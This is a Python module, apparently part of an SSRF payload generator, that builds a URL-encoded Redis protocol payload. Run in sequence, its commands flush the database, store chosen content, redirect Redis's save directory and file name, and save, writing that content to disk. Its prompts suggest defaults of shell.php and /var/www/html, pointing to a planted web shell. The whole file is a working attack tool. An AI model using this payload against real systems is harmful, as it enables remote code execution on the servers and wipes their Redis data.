from .base import *
import os

class Redis(GENERATOR):
    requirement = ["content", "dir", "filename"]
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 6379
        super().__init__(parser,options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()

        if arg.dir == "":
            self.dir = self.wizard_dir()
        else:
            self.dir = arg.dir

        if arg.filename == "":
            self.filename = self.wizard_filename()
        else:
            self.filename = arg.filename
        try:
            with open(self.filename, "r") as f:
                self.content = f.read()
        except:
            self.content = ""
            if arg.content == "":
                self.content = self.wizard_content()
            else:
                self.content = arg.content

    def generate(self):
        content = self.content
        dir = self.dir
        filename = self.filename
        redis_value = f"\n\n{content}\n\n"

        payload = "".join([
            "*1\r\n",
            "$8\r\n",
            "flushall\r\n",
            "*3\r\n",
            "$3\r\n",
            "set\r\n",
            "$1\r\n",
            "1\r\n",
            f"${len(redis_value)}\r\n",
            redis_value,
            "\r\n",
            "*4\r\n",
            "$6\r\n",
            "config\r\n",
            "$3\r\n",
            "set\r\n",
            "$3\r\n",
            "dir\r\n",
            f"${len(dir)}\r\n",
            f"{dir}\r\n",
            "*4\r\n",
            "$6\r\n",
            "config\r\n",
            "$3\r\n",
            "set\r\n",
            "$10\r\n",
            "dbfilename\r\n",
            f"${len(filename)}\r\n",
            f"{filename}\r\n",
            "*1\r\n",
            "$4\r\n",
            "save\r\n",
        ])

        self.set_mode(PAYLOAD_TYPE.QUOTE_PLUS).set_payload(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
        return super().generate()

    def wizard_content(self):
        content = input("\033[96m" + "Content: " + "\033[0m")
        return content
    def wizard_filename(self):
        filename = input("\033[96m" + "Filename (shell.php): " + "\033[0m")
        return filename
    def wizard_dir(self):
        dir = input("\033[96m" + "Directory (/var/www/html): " + "\033[0m")
        return dir
